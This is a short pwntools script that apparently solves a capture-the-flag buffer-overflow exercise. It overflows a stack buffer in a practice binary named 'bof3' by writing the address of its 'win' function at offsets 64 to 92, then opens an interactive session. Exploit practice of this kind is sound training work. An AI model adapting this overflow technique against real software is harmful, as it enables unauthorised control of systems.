from pwn import *

exe = context.binary = ELF('bof3')
winaddr = exe.symbols['win']
io = exe.process()

payload = fit({
    64: winaddr,
    68: winaddr,
    72: winaddr,
    76: winaddr,
    80: winaddr,
    84: winaddr,
    88: winaddr,
    92: winaddr,

})

io.sendline(payload)
io.interactive()